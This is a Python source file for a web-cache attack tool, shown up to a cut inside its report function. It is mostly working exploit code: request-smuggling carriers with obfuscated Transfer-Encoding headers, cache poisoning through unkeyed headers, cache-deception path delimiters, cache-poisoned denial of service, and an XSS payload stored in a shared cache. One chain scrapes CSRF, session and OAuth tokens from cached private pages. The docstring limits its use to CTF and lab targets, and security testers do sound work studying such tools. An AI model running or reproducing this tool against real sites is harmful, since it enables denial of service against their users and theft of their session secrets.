#!/usr/bin/env python3
"""
full_attack.py — Generic web-cache poisoning / deception / smuggling exploit driver.

Companion to full_recon.py. Where recon *maps* the surface, this *attacks* it: it
sweeps the full combination space of framing headers, X-headers, obfuscations and
payloads to actually achieve smuggling, desync, cache poisoning, cache deception and
CPDoS — then auto-detects which combination worked and prints the exact request to
replay.

Techniques (each can be selected with --tech):
  smuggle    request smuggling carriers: CL.TE / TE.CL / CL.CL + X-Content-Length /
             X-Transfer-Encoding variants, TE obfuscations, chunked/0-term/pad/gzip
             bodies, POST & GET carriers, gzip with/without a real Content-Length
  desync     timing + connection-reuse confirmation that front-end and origin disagree
  poison     cache poisoning: (a) via smuggling, (b) via unkeyed request headers
             (X-Forwarded-Host, X-Original-URL, ...) that leak into a shared cache entry
  deception  web cache deception: path-confusion delimiter x extension matrix
             (path-param, ; %2f %0a %00 %3b %23 %3f + DOUBLE-encoded variants)
  cpdos      cache-poisoned DoS: oversized headers / method-override / bad method /
             header meta-chars (bare LF/CR/NUL) that cache an error response
  hmc        header meta-char request splitting (bare LF injects a second request)
  chain      MULTI-STAGE attacks that compose the above into end-to-end exploits:
               - desync     -> persistent cache poisoning (poison served to many victims)
               - reflection -> cache poison -> stored XSS  (unkeyed reflected input)
               - smuggle    -> CPDoS  (sneak an error-triggering request past the cache)
               - deception  -> secret extraction (loot CSRF/session/OAuth tokens from
                               the cached private page)
             Chains reuse primitives the other techniques discover this run, or find
             them on demand, so `--tech chain` also works standalone.

Success model (generic, no per-challenge tuning needed):
  - drop the cache, capture an anonymous baseline signature of the target
  - run the attack, then fetch the target on a FRESH anonymous connection
  - success = that clean fetch now returns a DIFFERENT body (poisoned), the smuggled
    source page's body (substitution), an error code (CPDoS), or a canary marker we
    injected — and/or the cache reports HIT on the altered content.

Authorized testing only (CTF / lab / your own systems).

Examples:
  python full_attack.py --host TARGET --port 5002 \
      --cookie "session=<your-token-here>" \
      --target /login --source /join

  # Omit --cookie and you'll be asked whether the target needs one, then prompted.
  python full_attack.py --from-recon recon.json --aggressive

  python full_attack.py --host T --port 80 --target /login --tech smuggle,poison --aggressive
  python full_attack.py --host T --port 80 --target /login --keep    # leave it poisoned
"""

import argparse
import gzip
import json
import re
import sys
import time

try:
    from full_recon import (Target, parse, split_responses, cache_bust, C, phase,
                            resolve_cookie)
except ImportError:
    sys.exit("error: full_attack.py must sit next to full_recon.py (it reuses its "
             "socket/parse primitives).")


# --------------------------------------------------------------------------- #
# Combination space
# --------------------------------------------------------------------------- #

# Different spellings/obfuscations of the chunked transfer-encoding header line.
# Each entry is a RAW header line (no trailing CRLF). The standard one first; the
# obfuscations exercise lenient/strict parser disagreement between front-end & origin.
# Different spellings/obfuscations of the chunked transfer-encoding header line,
# expanded with the parser-discrepancy primitives catalogued in Jabiyev's
# "Systematic Search Techniques for HTTP Server Chain Attack Vectors" (2023).
# Each entry is a RAW header line (no trailing CRLF). The standard one first.
TE_VARIANTS = [
    "Transfer-Encoding: chunked",
    "Transfer-Encoding:\tchunked",            # tab instead of space
    "Transfer-Encoding : chunked",            # space before colon
    "Transfer-Encoding\t: chunked",           # tab before colon
    "transfer-encoding: chunked",             # lowercase
    "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity",  # dual TE
    "Transfer-Encoding: identity\r\nTransfer-Encoding: chunked",  # dual TE (reversed)
    " Transfer-Encoding: chunked",            # leading space (line folding)
    "Transfer-Encoding: \"chunked\"",         # quoted value
    "Transfer-Encoding: chunked, identity",   # list value
    "Transfer-Encoding: chunked, chunked",    # repeated coding
    "Transfer-Encoding:\x0bchunked",          # vertical tab separator
    "Transfer-Encoding: xchunked",            # value prefix
    "Transfer-Encoding: chunked\x0c",         # trailing form-feed
]

# The X-header variant this challenge family honors only on the origin.
XTE = "X-Transfer-Encoding: chunked"

# Header lines the origin may treat as the authoritative body length even when the
# front-end uses the standard Content-Length.
XCL = "X-Content-Length"

# Chunk last-chunk / terminator obfuscations (server-chain thesis): the proxy and
# origin disagree on where the chunked body ends. Each is a full body given an
# `inner` smuggled request; built lazily in _chunk_bodies().

# Unkeyed request headers commonly reflected/used by the origin but absent from the
# cache key — the classic web-cache-poisoning primitive.
UNKEYED_HEADERS = [
    "X-Forwarded-Host", "X-Forwarded-Scheme", "X-Forwarded-Proto",
    "X-Forwarded-For", "X-Forwarded-Server", "X-Forwarded-Port",
    "X-Host", "X-Original-Host", "X-Forwarded-Prefix",
    "X-Original-URL", "X-Rewrite-URL", "X-Override-URL",
    "X-HTTP-Method-Override", "X-HTTP-Method", "X-Method-Override",
    "Forwarded",
]

# Path-confusion delimiters for web cache deception, consolidated from Mirheidari
# et al. "Cached and Confused" (USENIX'20) and "WCD Escalates!" (USENIX'22). Each
# is inserted between the real (private) path and a fake static filename. The
# cache treats the whole thing as a static asset; the origin strips at the
# delimiter and serves the real page.
WCD_DELIMITERS = [
    ("path-param",     "/"),            # /account/foo.css  (original Gil attack)
    ("semicolon",      ";"),            # matrix/servlet path param
    ("enc-slash",      "%2f"),          # USENIX'22
    ("enc-newline",    "%0a"),
    ("enc-null",       "%00"),
    ("enc-semicolon",  "%3b"),
    ("enc-hash",       "%23"),
    ("enc-question",   "%3f"),
    ("enc-dotdot",     "/%2e%2e/"),
    # double-encoded variants (USENIX'22): survive one decode pass at the cache,
    # get decoded-then-stripped at the origin
    ("denc-slash",     "%252f"),
    ("denc-newline",   "%25%30%41"),
    ("denc-null",      "%25%30%30"),
    ("denc-question",  "%25%33%46"),
    ("denc-semicolon", "%25%33%42"),
    ("denc-hash",      "%25%32%33"),
    ("denc-slash2",    "%25%32%46"),
]
WCD_EXTENSIONS = [".css", ".js", ".jpg", ".png", ".ico", ".woff2", ".svg"]

# Header meta-characters for HMC / request-splitting and CPDoS.
META_CHARS = {"bareLF": "\n", "bareCR": "\r", "NUL": "\x00", "VT": "\x0b", "FF": "\x0c"}

CANARY = "cnry7r4p"          # marker we inject and search for in poisoned responses
# Reflected-XSS probe used by the reflect->poison->stored-XSS chain (USENIX'22 §"escalation")
XSS_PROBE = f'"><svg/onload=alert(/{CANARY}/)>'

# Patterns for the deception->secret-theft chain (the secret-extraction step from
# both WCD papers): names that flag a sensitive token in cached HTML/JS.
SECRET_NAME_HINTS = ("csrf", "xsrf", "token", "session", "sessid", "sid", "auth",
                     "state", "nonce", "client_id", "api_key", "apikey", "secret",
                     "access_token", "id_token")


def raw_req(method, path, header_lines, body, host):
    """Build a raw request from literal header LINES (full control for obfuscations)."""
    head = f"{method} {path} HTTP/1.1\r\nHost: {host}\r\n"
    head += "".join(line + "\r\n" for line in header_lines)
    head += "\r\n"
    return head.encode("latin1", "replace") + body


# --------------------------------------------------------------------------- #
# Attack engine
# --------------------------------------------------------------------------- #

class Attacker:
    def __init__(self, t, target, source, cookie, retries, aggressive, keep, verbose):
        self.t = t
        self.target = target
        self.source = source
        self.cookie = cookie
        self.retries = retries
        self.aggressive = aggressive
        self.keep = keep
        self.verbose = verbose
        self.hostport = f"{t.host}:{t.port}"
        self.wins = []          # list of dicts: technique, detail, raw, evidence
        self.base_anon = None   # anonymous baseline signature of target
        self.base_auth = None   # authenticated signature of target
        self.source_sig = None  # anonymous signature of source page
        # Primitives discovered by the individual techniques, consumed by chain().
        # This is what lets one attack feed the next.
        self.found = {
            "carrier": None,     # (cname, raw_carrier, iname) working smuggle carrier
            "wcd": None,         # (label, path) working deception URL
            "unkeyed": None,     # (header, value) working unkeyed-input poison
            "reflected": None,   # (header,) header whose value reflects unescaped
            "cpdos": None,       # (name, raw) request that caches an error
            "desync": False,     # timing-confirmed front-end/origin desync
        }

    # ---- helpers --------------------------------------------------------- #

    def _clean_get(self, path=None, cookie=False):
        """Fetch a path on a fresh connection (what a fresh victim/bot would see)."""
        path = path or self.target
        return parse(self.t.send(self.t.build("GET", path, cookie=cookie)))

    def _restore(self):
        if not self.keep:
            self.t.drop_cache()

    def _record(self, technique, detail, raw, evidence):
        self.wins.append({"technique": technique, "detail": detail,
                          "raw": raw, "evidence": evidence})
        print("    " + C.bad(f"<<< SUCCESS [{technique}] {detail}  ->  {evidence}"))

    def _vsay(self, msg):
        if self.verbose:
            print(C.dim("      " + msg))

    def baseline(self):
        phase("Baselines")
        self.t.drop_cache()
        a = self._clean_get(self.target, cookie=False)
        b = parse(self.t.send(self.t.build("GET", self.target, cookie=True)))
        s = self._clean_get(self.source, cookie=False)
        self.base_anon, self.base_auth, self.source_sig = a["sig"], b["sig"], s["sig"]
        print(f"  target {self.target:<14} anon={a['code']} sig={a['sig']} "
              f"len={a['body_len']}  |  auth sig={b['sig']}")
        print(f"  source {self.source:<14} anon={s['code']} sig={s['sig']} "
              f"len={s['body_len']}")
        print(C.dim(f"  (poison detected when a fresh anonymous GET {self.target} no "
                    f"longer == {self.base_anon})"))

    def _changed(self, chk):
        """Did a fresh fetch diverge from the anonymous baseline meaningfully?"""
        return (chk["sig"] != self.base_anon and chk["sig"] != "00000000"
                and chk["code"] != 0)

    # ---- inner requests to smuggle --------------------------------------- #

    def _inners(self):
        h = self.hostport
        cookie_line = f"Cookie: {self.cookie}\r\n" if self.cookie else ""
        return [
            ("source-sub",
             f"GET {self.source} HTTP/1.1\r\nHost: {h}\r\n{cookie_line}X-Foo:".encode()),
            ("404",
             f"GET /cache-poison-404 HTTP/1.1\r\nHost: {h}\r\nX-Foo:".encode()),
            ("HMO-POST",
             f"GET {self.target} HTTP/1.1\r\nHost: {h}\r\n"
             f"X-HTTP-Method-Override: POST\r\nX-Hack-Mode: 1\r\nX-Foo:".encode()),
            ("PUT-405",
             f"PUT {self.target} HTTP/1.1\r\nHost: {h}\r\nX-Hack-Mode: 1\r\nX-Foo:".encode()),
        ]

    # ---- carrier generation (the full combination sweep) ----------------- #

    def _carriers(self, inner):
        """
        Yield (name, raw_carrier) tuples that try to smuggle `inner` past the
        front-end. Covers CL.TE / TE.CL / CL.CL and the X-header variants, across
        several body framings and (optionally) TE obfuscations.
        """
        h = self.hostport
        te0 = b"0\r\n\r\n" + inner                                  # chunk terminator + smuggled
        chunkwrap = f"{len(inner):x}\r\n".encode() + inner + b"\r\n0\r\n\r\n"
        pad = b"A" * 24 + inner
        gz0 = gzip.compress(b"0\r\n\r\n" + inner)

        te_list = TE_VARIANTS if self.aggressive else TE_VARIANTS[:3]
        out = []

        # --- CL.TE: front-end honors Content-Length (reads whole body),
        #            origin honors Transfer-Encoding (stops at 0-chunk -> inner leaks)
        for te in te_list:
            for body, bm in [(te0, "0term"), (chunkwrap, "wrap")]:
                out.append((f"CL.TE [{te.strip()[:24]}|{bm}]",
                            raw_req("POST", self.target,
                                    ["X-Hack-Mode: 1", te, f"Content-Length: {len(body)}"],
                                    body, h)))

        # --- CL.xTE: origin honors the custom X-Transfer-Encoding (this family's bug).
        #     Try GET carriers too (--aggressive): some origins parse a GET body
        #     differently from a POST body, opening a desync a POST won't.
        for method in (["POST", "GET"] if self.aggressive else ["POST"]):
            for body, bm in [(te0, "0term"), (chunkwrap, "wrap")]:
                out.append((f"CL.xTE {method} [{bm}]",
                            raw_req(method, self.target,
                                    ["X-Hack-Mode: 1", XTE, f"Content-Length: {len(body)}"],
                                    body, h)))

        # --- TE.CL: front-end honors Transfer-Encoding (forwards chunked),
        #            origin honors a short Content-Length (leaves the rest)
        for te in te_list[:3]:
            out.append((f"TE.CL [{te.strip()[:24]}]",
                        raw_req("POST", self.target,
                                ["X-Hack-Mode: 1", te, "Content-Length: 4"],
                                chunkwrap, h)))

        # --- CL.CL / xCL.CL: front-end uses real Content-Length, origin reads a
        #            short X-Content-Length and leaves the trailing smuggled bytes
        for xcl in ([1, 4, 10] if self.aggressive else [4]):
            out.append((f"xCL.CL [X-CL={xcl}]",
                        raw_req("POST", self.target,
                                ["X-Hack-Mode: 1", f"{XCL}: {xcl}",
                                 f"Content-Length: {len(pad)}"],
                                pad, h)))

        # --- CE desync: gzip body; encoded vs decoded length disagreement.
        #     X-CL spans the compressed length, the decoded length, and 0 so the
        #     origin's idea of the body end (after gzip-decode) diverges from the
        #     front-end's (which frames on the compressed Content-Length).
        #     Two carrier shapes, ported from Challenge4/testing.py:
        #       (i)  with a real Content-Length  (carrier)
        #       (ii) X-Content-Length only, no real CL, keep-alive (carrier_xcl_only)
        #     and both POST and GET methods under --aggressive.
        ce_xcls = ([(len(gz0), "enc"), (len(b'0\r\n\r\n') + len(inner), "dec"), (0, "0")]
                   if self.aggressive else [(0, "0")])
        ce_methods = ["POST", "GET"] if self.aggressive else ["POST"]
        for method in ce_methods:
            for xcl, lbl in ce_xcls:
                # (i) real Content-Length present (front-end frames on compressed size)
                out.append((f"CE/gzip {method} [X-CL={lbl}]",
                            raw_req(method, self.target,
                                    ["X-Hack-Mode: 1", "Content-Encoding: gzip",
                                     f"{XCL}: {xcl}", f"Content-Length: {len(gz0)}"],
                                    gz0, h)))
                # (ii) no real Content-Length: origin's X-Content-Length is the only
                #      length signal, so a mismatch leaks trailing bytes (keep-alive)
                if self.aggressive:
                    out.append((f"CE/gzip {method} xcl-only [X-CL={lbl}]",
                                raw_req(method, self.target,
                                        ["X-Hack-Mode: 1", "Content-Encoding: gzip",
                                         f"{XCL}: {xcl}", "Connection: keep-alive"],
                                        gz0, h)))
        return out

    # ---- techniques ------------------------------------------------------ #

    def smuggle_and_poison(self, do_poison=True):
        phase("SMUGGLING + cache poisoning via desync")
        victim = self.t.build("GET", self.target, cookie=False)
        total = 0
        for iname, inner in self._inners():
            for cname, carrier in self._carriers(inner):
                total += 1
                self.t.drop_cache()
                hit = self._attempt_poison(carrier, victim, iname)
                if hit:
                    detail = f"{cname} + inner={iname}"
                    self._record("smuggle/poison", detail, carrier, hit)
                    if not self.found["carrier"]:
                        self.found["carrier"] = (cname, carrier, iname)
                    self._restore()
                    if not self.aggressive:
                        break  # one working carrier per inner is enough unless aggressive
                elif self.verbose:
                    print(C.dim(f"    tried {cname:<28} inner={iname:<10} (no change)"))
        print(C.dim(f"\n  swept {total} carrier/inner combinations"))

    def _attempt_poison(self, carrier, victim, iname):
        """Fire carrier(+victim) on a reused connection; detect a poisoned clean fetch."""
        for i in range(self.retries):
            # also watch for a timing stall (origin waiting for more body = desync)
            t0 = time.time()
            data = self.t.send_pair(carrier, victim)
            elapsed = time.time() - t0
            parts = split_responses(data)
            chk = self._clean_get(self.target, cookie=False)
            # success signatures (generic):
            if self._changed(chk):
                ev = f"clean GET sig {self.base_anon}->{chk['sig']} (code {chk['code']})"
                if iname == "source-sub" and chk["sig"] == self.source_sig:
                    ev = f"clean GET now serves {self.source} body ({chk['sig']})"
                return ev
            if len(parts) >= 3:
                return f"{len(parts)} pipelined responses from a 2-request socket (smuggled)"
            if self.verbose and elapsed > 2.0:
                self._vsay(f"{iname}: carrier stalled {elapsed:.1f}s (possible desync)")
            time.sleep(0.25 if not self.aggressive else 0.1)
        return None

    def desync_timing(self):
        phase("DESYNC confirmation (timing)")
        h = self.hostport
        # Carrier that makes a TE-honoring origin wait for another chunk that never
        # comes -> the response stalls until timeout if front-end already forwarded.
        stall = raw_req("POST", self.target,
                        ["X-Hack-Mode: 1", "Transfer-Encoding: chunked",
                         "X-Transfer-Encoding: chunked", "Content-Length: 6"],
                        b"1\r\nZ\r\n", h)   # incomplete: promises more, sends partial
        # baseline timing of a normal request
        t0 = time.time(); self.t.send(self.t.build("GET", self.target)); base_t = time.time() - t0
        t0 = time.time(); self.t.send(stall); stall_t = time.time() - t0
        print(f"  normal RTT ~{base_t*1000:.0f}ms   stall-probe ~{stall_t*1000:.0f}ms")
        if stall_t > max(2.0, base_t * 5 + 1.0):
            self.found["desync"] = True
            self._record("desync", "timing", stall,
                         f"stall probe hung {stall_t:.1f}s vs {base_t:.2f}s baseline "
                         f"=> front-end/origin length disagreement")
        else:
            print(C.dim("  no significant stall (no timing-observable desync here)"))
        self._restore()

    def poison_unkeyed(self):
        phase("CACHE POISONING via unkeyed request headers")
        for hdr in UNKEYED_HEADERS:
            self.t.drop_cache()
            # choose a value that's meaningful for the header type
            if "URL" in hdr:
                val = self.source                      # path-override -> serve source page
            elif "Method" in hdr:
                val = "POST"                            # method override -> different page
            else:
                val = f"{CANARY}.attacker.test"         # host/proto injection -> reflection
            # 1) prime the cache through the front-end with the malicious header
            primed = parse(self.t.send(self.t.build("GET", self.target, {hdr: val})))
            # 2) what a fresh anonymous victim now gets, with NO special header
            chk = self._clean_get(self.target, cookie=False)
            body_has_canary = CANARY in self.t.send(
                self.t.build("GET", self.target, cookie=False)).decode("latin1", "replace")
            poisoned = self._changed(chk) or body_has_canary
            if poisoned:
                ev = (f"canary reflected into shared cache" if body_has_canary
                      else f"clean GET sig {self.base_anon}->{chk['sig']}")
                self._record("poison/unkeyed", f"{hdr}: {val}",
                             self.t.build("GET", self.target, {hdr: val}), ev)
                if not self.found["unkeyed"]:
                    self.found["unkeyed"] = (hdr, val)
                if body_has_canary and not self.found["reflected"]:
                    self.found["reflected"] = (hdr,)   # reflects into the cached body
            elif self.verbose:
                print(C.dim(f"    {hdr:<26} primed={primed['code']} -> clean "
                            f"sig={chk['sig']} (no change)"))
            self._restore()

    def _wcd_suffixes(self):
        """Build (label, suffix) deception probes from the delimiter x extension matrix."""
        exts = WCD_EXTENSIONS if self.aggressive else [".css", ".js"]
        delims = WCD_DELIMITERS if self.aggressive else WCD_DELIMITERS[:9]
        out = []
        for dlabel, d in delims:
            for ext in exts:
                out.append((f"{dlabel}{ext}", f"{d}wcd{ext}"))
        return out

    def deception(self):
        phase("CACHE DECEPTION (path confusion)")
        # the authed body we hope to leak to anonymous victims via a static URL
        auth = parse(self.t.send(self.t.build("GET", self.target, cookie=True)))
        total = 0
        for label, suf in self._wcd_suffixes():
            total += 1
            path = self.target.rstrip("/") + suf
            self.t.drop_cache()
            # attacker (authed) requests the deceptive URL -> cache may store authed body
            a = parse(self.t.send(self.t.build("GET", path, cookie=True)))
            # victim (anonymous) requests the same deceptive URL
            v = parse(self.t.send(self.t.build("GET", path, cookie=False)))
            served_auth = (v["sig"] == auth["sig"] and auth["sig"] != "00000000")
            cached = (v["cache_state"] == "HIT" or "public" in a["cache_control"].lower()
                      or v["cache_state"].startswith("AGE"))
            if served_auth and cached:
                self._record("deception", f"{label} ('{suf}')",
                             self.t.build("GET", path, cookie=True),
                             f"anonymous victim served the AUTHED body ({v['sig']}) from "
                             f"cache via static-looking URL")
                if not self.found["wcd"]:
                    self.found["wcd"] = (label, path)
                if not self.aggressive:
                    break  # one working delimiter is enough unless sweeping everything
            elif self.verbose:
                print(C.dim(f"    {label:<16} code={v['code']} sig={v['sig']} "
                            f"cache={v['cache_state']} authmatch={served_auth}"))
            self._restore()
        print(C.dim(f"\n  swept {total} delimiter/extension combinations"))

    def cpdos(self):
        phase("CPDoS (cache-poisoned denial of service)")
        base = self._clean_get(self.target, cookie=False)
        probes = [("oversized-header", {"X-Big": "A" * 24000})]
        for h in ("X-HTTP-Method-Override", "X-HTTP-Method", "X-Method-Override"):
            probes.append((f"{h}=DELETE", {h: "DELETE", "X-Hack-Mode": "1"}))
        for name, ch in META_CHARS.items():
            probes.append((f"metachar-{name}", {"X-Probe": f"a{ch}b"}))
        bad_methods = [("method-FOO", "FOO"), ("method-TRACK", "TRACK")]

        for name, hdrs in probes:
            self.t.drop_cache()
            r = parse(self.t.send(self.t.build("GET", self.target, hdrs)))
            self._cpdos_detect(name, base, r, self.t.build("GET", self.target, hdrs))
        for name, m in bad_methods:
            self.t.drop_cache()
            r = parse(self.t.send(self.t.build(m, self.target)))
            self._cpdos_detect(name, base, r, self.t.build(m, self.target))

    def _cpdos_detect(self, name, base, r, raw):
        if r["code"] == base["code"] or r["code"] == 0:
            if self.verbose:
                print(C.dim(f"    {name:<22} -> {r['code']} (same as baseline)"))
            return
        # the error differs; does a CLEAN subsequent GET now return that error?
        follow = self._clean_get(self.target, cookie=False)
        if follow["code"] == r["code"] and follow["code"] != base["code"]:
            self._record("cpdos", name, raw,
                         f"clean GET now returns {r['code']} (was {base['code']}) - DoS")
            if not self.found["cpdos"]:
                self.found["cpdos"] = (name, raw)
            self._restore()
        elif self.verbose:
            print(C.dim(f"    {name:<22} -> {r['code']} but not cached (clean={follow['code']})"))

    def hmc(self):
        phase("HMC request splitting (bare LF / CR header injection)")
        h = self.hostport
        # inject a bare LF then a smuggled header/request line into a header value
        for name, ch in (("bareLF", "\n"), ("bareCR", "\r"), ("CRLF", "\r\n")):
            self.t.drop_cache()
            injected_line = f"X-Junk: a{ch}X-Cache-Inject: {CANARY}"
            raw = raw_req("GET", self.target, ["X-Hack-Mode: 1", injected_line], b"", h)
            data = self.t.send(raw)
            parts = split_responses(data)
            chk = self._clean_get(self.target, cookie=False)
            if len(parts) >= 2:
                self._record("hmc", f"{name} splits request",
                             raw, f"{len(parts)} responses from a single request")
            elif self._changed(chk):
                self._record("hmc", f"{name} alters cached response",
                             raw, f"clean GET sig {self.base_anon}->{chk['sig']}")
            elif self.verbose:
                print(C.dim(f"    {name:<8} responses={len(parts)} clean_sig={chk['sig']}"))
            self._restore()

    # ---- chaining engine -------------------------------------------------- #
    #
    # Chaining composes the primitives the individual techniques discover into
    # end-to-end exploits. Each chain consumes whatever is already in self.found
    # (populated when the matching technique ran earlier this session) and, if the
    # prerequisite is missing, runs a compact finder so the chain still works when
    # invoked alone with --tech chain.

    def _cpdos_inners(self):
        """Smuggled inner requests that make the ORIGIN emit a cacheable error."""
        h = self.hostport
        return [
            ("oversized-header",
             f"GET {self.target} HTTP/1.1\r\nHost: {h}\r\nX-Big: {'A' * 20000}\r\n"
             f"X-Foo:".encode()),
            ("method-override",
             f"GET {self.target} HTTP/1.1\r\nHost: {h}\r\n"
             f"X-HTTP-Method-Override: DELETE\r\nX-Foo:".encode()),
        ]

    def _ensure_carrier(self):
        """Return a working smuggle carrier (cname, raw, iname), discovering one if needed."""
        if self.found["carrier"]:
            return self.found["carrier"]
        victim = self.t.build("GET", self.target, cookie=False)
        for iname, inner in self._inners():
            for cname, carrier in self._carriers(inner):
                self.t.drop_cache()
                if self._attempt_poison(carrier, victim, iname):
                    self.found["carrier"] = (cname, carrier, iname)
                    self._restore()
                    return self.found["carrier"]
        return None

    def _ensure_wcd(self):
        """Return a working deception URL (label, path), discovering one if needed."""
        if self.found["wcd"]:
            return self.found["wcd"]
        auth = parse(self.t.send(self.t.build("GET", self.target, cookie=True)))
        for label, suf in self._wcd_suffixes():
            path = self.target.rstrip("/") + suf
            self.t.drop_cache()
            a = parse(self.t.send(self.t.build("GET", path, cookie=True)))
            v = parse(self.t.send(self.t.build("GET", path, cookie=False)))
            served_auth = (v["sig"] == auth["sig"] and auth["sig"] != "00000000")
            cached = (v["cache_state"] == "HIT"
                      or "public" in a["cache_control"].lower()
                      or v["cache_state"].startswith("AGE"))
            self._restore()
            if served_auth and cached:
                self.found["wcd"] = (label, path)
                return self.found["wcd"]
        return None

    @staticmethod
    def _high_entropy(s):
        """Cheap randomness heuristic (stand-in for the papers' Shannon-entropy check)."""
        if len(s) < 16:
            return False
        classes = sum([any(c.islower() for c in s), any(c.isupper() for c in s),
                       any(c.isdigit() for c in s)])
        return classes >= 2 and len(set(s)) >= max(10, len(s) // 2)

    # attribute scanners for the secret extractor
    _NAME_ATTR = re.compile(r'\b(?:name|id)\s*=\s*["\']?([\w\-]+)', re.I)
    _VAL_ATTR = re.compile(r'\b(?:value|content)\s*=\s*["\']([^"\']{8,})["\']', re.I)
    _TAG = re.compile(r'<(?:input|meta)\b[^>]*>', re.I)
    # name = "val" | name: "val" | "name":"val"  (JS / JSON assignments)
    _KV = re.compile(r'["\']?([\w\-]{2,40})["\']?\s*[:=]\s*["\']([A-Za-z0-9_\-\.]{12,})["\']')
    # ?name=val&...  (query-string / form-encoded)
    _QS = re.compile(r'[?&]([\w\-]{2,40})=([A-Za-z0-9_\-\.%]{12,})')

    def _extract_secrets(self, body):
        """
        Scan an HTML/JS body for likely secrets (CSRF/session/OAuth/API tokens) and
        return (field_name, value) pairs using the field's REAL name where possible —
        e.g. the `name=` of an <input>, not the literal attribute "value".
        """
        out, seen_pairs, seen_vals = [], set(), set()

        def add(name, val):
            if not val or len(val) < 8:
                return
            if val in seen_vals or (name, val) in seen_pairs:
                return
            named = any(k in name.lower() for k in SECRET_NAME_HINTS)
            if named or self._high_entropy(val):
                seen_pairs.add((name, val))
                seen_vals.add(val)
                out.append((name, val))

        # 1) <input>/<meta> tags: pair the name/id attr with the value/content attr,
        #    regardless of attribute order — this yields the real field name.
        for tag in self._TAG.findall(body):
            nm = self._NAME_ATTR.search(tag)
            vl = self._VAL_ATTR.search(tag)
            if nm and vl:
                add(nm.group(1), vl.group(1))
        # 2) JS/JSON assignments (var csrf = "..."; "sid":"..."). seen_vals dedup keeps
        #    us from re-reporting a tag value under the literal name "value".
        for m in self._KV.finditer(body):
            add(m.group(1), m.group(2))
        # 3) query-string / form-encoded token=value pairs in links and forms
        for m in self._QS.finditer(body):
            add(m.group(1), m.group(2))
        return out

    def chain(self):
        phase("CHAINS (multi-stage attacks)")
        print(C.dim("  composing discovered primitives into end-to-end exploits...\n"))
        self._chain_desync_to_poison()
        self._chain_reflect_to_xss()
        self._chain_smuggle_to_cpdos()
        self._chain_deception_to_secrets()

    def _chain_desync_to_poison(self):
        print(C.hdr("  [chain] desync -> persistent cache poisoning"))
        car = self._ensure_carrier()
        if not car:
            print(C.dim("    no working smuggle carrier; chain not applicable\n"))
            return
        cname, carrier, iname = car
        victim = self.t.build("GET", self.target, cookie=False)
        self.t.drop_cache()
        for _ in range(self.retries):
            self.t.send_pair(carrier, victim)
            v1 = self._clean_get(self.target, cookie=False)
            if self._changed(v1):
                v2 = self._clean_get(self.target, cookie=False)   # 2nd independent victim
                persists = v2["sig"] == v1["sig"]
                self._record(
                    "chain:poison", f"{cname} (inner={iname})", carrier,
                    f"shared entry poisoned; {'persists across' if persists else 'served to'} "
                    f"consecutive anonymous victims (sig {v1['sig']})")
                break
            time.sleep(0.2)
        else:
            print(C.dim("    carrier did not re-poison on replay\n"))
        self._restore()

    def _chain_reflect_to_xss(self):
        print(C.hdr("  [chain] reflected unkeyed input -> cache poison -> stored XSS"))
        hdr = self.found["reflected"][0] if self.found["reflected"] else None
        if not hdr:                                    # discover a reflecting header
            for h in UNKEYED_HEADERS:
                if "Method" in h or "URL" in h:        # these don't reflect as text
                    continue
                self.t.drop_cache()
                body = self.t.send(
                    self.t.build("GET", self.target, {h: XSS_PROBE})).decode("latin1", "replace")
                if XSS_PROBE in body or f"/{CANARY}/" in body:
                    hdr = h
                    self.found["reflected"] = (h,)
                    break
        if not hdr:
            print(C.dim("    no reflected unkeyed header found; chain not applicable\n"))
            return
        # prime the shared cache with the XSS payload carried in the unkeyed header
        self.t.drop_cache()
        self.t.send(self.t.build("GET", self.target, {hdr: XSS_PROBE}))
        victim = self.t.send(
            self.t.build("GET", self.target, cookie=False)).decode("latin1", "replace")
        if XSS_PROBE in victim or f"onload=alert(/{CANARY}/)" in victim:
            self._record(
                "chain:xss", f"reflected {hdr} -> cached stored XSS",
                self.t.build("GET", self.target, {hdr: XSS_PROBE}),
                f"XSS payload via {hdr} is served from the shared cache to ALL anonymous "
                f"victims (reflected -> poisoned -> stored)")
        else:
            print(C.dim(f"    {hdr} reflects but payload not cached for anonymous users\n"))
        self._restore()

    def _chain_smuggle_to_cpdos(self):
        print(C.hdr("  [chain] smuggle -> CPDoS (cache an error past the front-end)"))
        car = self._ensure_carrier()
        if not car:
            print(C.dim("    no working smuggle carrier; chain not applicable\n"))
            return
        cname, _, _ = car
        base = self._clean_get(self.target, cookie=False)
        victim = self.t.build("GET", self.target, cookie=False)
        for label, inner in self._cpdos_inners():
            carriers = dict(self._carriers(inner))
            carrier = carriers.get(cname) or next(iter(carriers.values()), None)
            if not carrier:
                continue
            self.t.drop_cache()
            landed = False
            for _ in range(self.retries):
                self.t.send_pair(carrier, victim)
                chk = self._clean_get(self.target, cookie=False)
                if chk["code"] >= 400 and chk["code"] != base["code"]:
                    self._record(
                        "chain:smuggle-cpdos", f"{cname} + cpdos-inner={label}", carrier,
                        f"smuggled {label} made the cache store {chk['code']} under "
                        f"{self.target} (was {base['code']}) - DoS via desync")
                    landed = True
                    break
                time.sleep(0.2)
            self._restore()
            if landed and not self.aggressive:
                break

    def _chain_deception_to_secrets(self):
        print(C.hdr("  [chain] cache deception -> secret extraction"))
        wcd = self._ensure_wcd()
        if not wcd:
            print(C.dim("    no working deception URL; chain not applicable\n"))
            return
        label, path = wcd
        # the deceptive URL holds the authed body in cache; read it as an anonymous user
        self.t.drop_cache()
        self.t.send(self.t.build("GET", path, cookie=True))      # prime w/ authed content
        body = self.t.send(
            self.t.build("GET", path, cookie=False)).decode("latin1", "replace")
        secrets = self._extract_secrets(body)
        if secrets:
            ev = "; ".join(f"{n}={v[:12]}..." for n, v in secrets[:5])
            self._record(
                "chain:loot", f"{label} -> {len(secrets)} secret(s)",
                self.t.build("GET", path, cookie=True),
                f"anonymous cache entry leaks: {ev}")
        else:
            print(C.dim("    deception works but no secrets matched in the cached body\n"))
        self._restore()

    # ---- final report ---------------------------------------------------- #

    def report(self):
        phase("RESULTS")
        if not self.wins:
            print(C.warn("  No technique succeeded with the current combination set."))
            print(C.dim("  Try: --aggressive (full obfuscation sweep), a different "
                        "--source, more --retries, or confirm the target via full_recon.py."))
            return
        print(C.ok(f"  {len(self.wins)} working vector(s):\n"))
        for i, w in enumerate(self.wins, 1):
            print(C.bad(f"  [{i}] {w['technique']}: {w['detail']}"))
            print(C.dim(f"      evidence: {w['evidence']}"))
            print(C.dim("      replay request:"))
            preview = w["raw"].decode("latin1", "replace")
            for line in preview.split("\r\n")[:14]:
